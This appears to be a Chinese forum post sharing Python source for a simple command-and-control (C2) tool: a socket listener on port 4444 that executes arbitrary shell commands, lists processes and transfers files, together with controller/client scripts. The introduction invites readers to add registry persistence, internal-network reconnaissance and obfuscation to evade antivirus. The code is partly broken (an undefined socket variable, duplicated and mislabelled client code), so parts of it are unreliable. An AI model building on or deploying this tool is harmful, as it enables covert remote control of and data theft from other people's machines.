这是一个简单的正向连接c2工具。师傅们可根据自己需求开发，增加更多的功能。列如什么写一键写注册表，一键内网信息收集，屏幕交互，混淆过免杀等操作。
反向连接在开发上出现了一些问题

反向连接的控制端如下：

###
import socket
import threading
import subprocess
import os
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def handle_client(client_socket, client_address):
    try:
        logging.info(f"[+] Accepted connection from {client_address}. Sending welcome message...")
        client_socket.sendall("Welcome to the C2 server!\n".encode('utf-8'))

        # 创建一个线程来处理用户输入
        def get_user_input():
            try:
                while True:
                    cmd_input = input("fox > ").strip()
                    if cmd_input.lower() == 'exit':
                        client_socket.sendall("exit\n".encode('utf-8'))
                        break
                    if cmd_input:
                        client_socket.sendall(cmd_input.encode('utf-8'))
            except Exception as e:
                logging.error(f"Error in user input thread: {e}")
            finally:
                client_socket.close()
                logging.info(f"Closed connection with {client_address} due to user input thread exit.")

        # 启动用户输入线程
        input_thread = threading.Thread(target=get_user_input)
        input_thread.start()

        # 主线程继续接收并处理客户端数据
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            logging.info(f"Received data from {client_address}: {data.decode('utf-8')}")

            # 处理命令
            command = data.decode('utf-8').strip()
            if command.lower() == 'help':
                client_socket.sendall("Available commands:\n".encode('utf-8'))
                client_socket.sendall("     help       - 显示此帮助消息\n".encode('utf-8'))
                client_socket.sendall("     shell      - 在服务器上执行 shell 命令\n".encode('utf-8'))
                client_socket.sendall("     w          - 列出服务器上正在运行的进程\n".encode('utf-8'))
                client_socket.sendall("     do         - 从服务器下载文件, 你需要指定服务器上的文件路径和要保存的本地路径。如do /path/to/remote/file /local/path/to/save\n".encode('utf-8'))
                client_socket.sendall("     du         - 将文件上传到服务器，需要指定本地文件路径和服务器上的保存路径。如du /local/path/to/file /path/to/remote/save\n".encode('utf-8'))
                client_socket.sendall("     xs         - 截屏并保存到服务器，你需要指定保存路径。如xs /path/to/remote/save\n".encode('utf-8'))
            elif command.lower().startswith('shell '):
                shell_command = command[6:]
                try:
                    output = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                    client_socket.sendall(output)
                except subprocess.CalledProcessError as e:
                    client_socket.sendall(e.output)
            elif command.lower() == 'w':
                try:
                    process_list = subprocess.check_output(['ps', 'aux'], shell=True)
                    client_socket.sendall(process_list)
                except subprocess.CalledProcessError as e:
                    client_socket.sendall(e.output)
            elif command.lower().startswith('do '):
                do_command = command[3:]
                try:
                    local_path, remote_path = do_command.split(' ', 1)
                    with open(local_path, 'rb') as local_file:
                        client_socket.sendall(f"Downloading {local_path} to {remote_path}\n".encode('utf-8'))
                        with open(remote_path, 'wb') as remote_file:
                            remote_file.write(local_file.read())
                            client_socket.sendall(f"Downloaded {local_path} to {remote_path}\n".encode('utf-8'))
                except Exception as e:
                    client_socket.sendall(f"Error downloading file: {e}\n".encode('utf-8'))
            elif command.lower().startswith('du '):
                du_command = command[3:]
                try:
                    local_path, remote_path = du_command.split(' ', 1)
                    with open(local_path, 'rb') as local_file:
                        client_socket.sendall(f"Uploading {local_path} to {remote_path}\n".encode('utf-8'))
                        with open(remote_path, 'wb') as remote_file:
                            remote_file.write(local_file.read())
                            client_socket.sendall(f"Uploaded {local_path} to {remote_path}\n".encode('utf-8'))
                except Exception as e:
                    client_socket.sendall(f"Error uploading file: {e}\n".encode('utf-8'))
            elif command.lower().startswith('xs '):
                xs_command = command[3:]
                try:
                    # 这里需要一个截屏命令，例如使用scrot或其他截图工具
                    # screenshot_command = f"scrot {xs_command}"
                    # output = subprocess.check_output(screenshot_command, shell=True)
                    # client_socket.sendall(output)
                    client_socket.sendall("Screenshot not implemented yet.\n".encode('utf-8'))
                except Exception as e:
                    client_socket.sendall(f"Error taking screenshot: {e}\n".encode('utf-8'))
            else:
                client_socket.sendall("Unknown command.\n".encode('utf-8'))

    except Exception as e:
        logging.error(f"Error handling client {client_address}: {e}")
    finally:
        client_socket.close()
        if input_thread.is_alive():
            input_thread.join()
        logging.info(f"Closed connection with {client_address}.")

def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    logging.info("[+] Listening for connections on 0.0.0.0:4444")

    try:
        while True:
            client, addr = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client, addr))
            client_handler.start()

    except KeyboardInterrupt:
        logging.info("Server shutdown requested.")
    finally:
        server.close()
        logging.info("Server socket closed.")

if __name__ == "__main__":
    server_loop()和import socket
import threading
import os

def receive_data(client_socket):
    try:
        response = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            response += data
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def send_command(client_socket, command):
    try:
        client_socket.send(command.encode('utf-8'))
        if command.lower() == 'exit':
            return False
        return True
    except Exception as e:
        print(f"Error sending command: {e}")
        return False

def client_loop():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(('127.0.0.1', 4444))  # 假设控制端运行在本地主机上
        print(receive_data(client))  # Receive welcome message

        while True:
            command = input("> ").strip()
            if not send_command(client, command):
                break

            if command.lower() == 'help':
                print("Available commands:")
                print("   help     - 显示此帮助消息")
                print("   shell    - 在服务器上执行 shell 命令")
                print("   w        - 列出服务器上正在运行的进程")
                print("   do       - 从服务器下载文件, 你需要指定服务器上的文件路径和要保存的本地路径。如do /path/to/remote/file /local/path/to/save")
                print("   du       - 将文件上传到服务器，需要指定本地文件路径和服务器上的保存路径。如du /local/path/to/file /path/to/remote/save")
                print("   xs       - 截屏并保存到服务器，你需要指定保存路径。如xs /path/to/remote/save")
            elif command.lower().startswith('shell '):
                # 执行 shell 命令
                shell_command = command[6:]
                client_socket.sendall(f"shell {shell_command}\n".encode())
                print(receive_data(client))
            elif command.lower() == 'w':
                # 列出进程
                client_socket.sendall(b"w\n")
                print(receive_data(client))
            elif command.lower().startswith('do '):
                # 下载文件
                do_command = command[3:]
                client_socket.sendall(f"do {do_command}\n".encode())
                print(receive_data(client))
            elif command.lower().startswith('du '):
                # 上传文件
                du_command = command[3:]
                client_socket.sendall(f"du {du_command}\n".encode())
                print(receive_data(client))
            elif command.lower().startswith('xs '):
                # 截屏并保存
                xs_command = command[3:]
                client_socket.sendall(f"xs {xs_command}\n".encode())
                print(receive_data(client))
            else:
                print("Unknown command. Type 'help' for a list of available commands.")

    except ConnectionRefusedError:
        print("[!] Connection refused. Make sure the server is running and listening on the correct host and port.")
    except KeyboardInterrupt:
        print("\n[!] Closing connection...")
    finally:
        client.close()

def main():
    client_loop()

if __name__ == "__main__":
    main() 
###
    
反向连接被控制端代码如下：

###
import socket
import threading

def receive_data(client_socket):
    try:
        response = b""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            response += data
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def send_command(client_socket, command):
    try:
        client_socket.send(command.encode('utf-8'))
        if command.lower() == 'exit':
            return False
        return True
    except Exception as e:
        print(f"Error sending command: {e}")
        return False

def client_loop():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(('127.0.0.1', 4444))  # 假设控制端运行在本地主机上
        print(receive_data(client))  # Receive welcome message

        while True:
            command = input("> ").strip()
            if not send_command(client, command):
                break

            if command.lower() == 'help':
                print("Available commands:")
                print("    help      - 显示此帮助消息")
                print("    shell     - 在服务器上执行 shell 命令")
                print("    w         - 列出服务器上正在运行的进程")
                print("    do        - 从服务器下载文件, 你需要指定服务器上的文件路径和要保存的本地路径。")
                print("    du        - 将文件上传到服务器，需要指定本地文件路径和服务器上的保存路径。")
                print("    xs        - 截屏并保存到服务器，你需要指定保存路径。")
            elif command.lower().startswith('shell '):
                # 执行 shell 命令
                shell_command = command[6:]
                client.sendall(f"shell {shell_command}\n".encode())
                print(receive_data(client))
            elif command.lower() == 'w':
                # 列出进程
                client.sendall(b"w\n")
                print(receive_data(client))
            elif command.lower().startswith('do '):
                # 下载文件
                do_command = command[3:]
                client.sendall(f"do {do_command}\n".encode())
                print(receive_data(client))
            elif command.lower().startswith('du '):
                # 上传文件
                du_command = command[3:]
                client.sendall(f"du {du_command}\n".encode())
                print(receive_data(client))
            elif command.lower().startswith('xs '):
                # 截屏并保存
                xs_command = command[3:]
                client.sendall(f"xs {xs_command}\n".encode())
                print(receive_data(client))
            else:
                print("Unknown command. Type 'help' for a list of available commands.")

    except ConnectionRefusedError:
        print("[!] Connection refused. Make sure the server is running and listening on the correct host and port.")
    except KeyboardInterrupt:
        print("\n[!] Closing connection...")
    finally:
        client.close()
        
if __name__ == "__main__":
    client_loop()
    ###
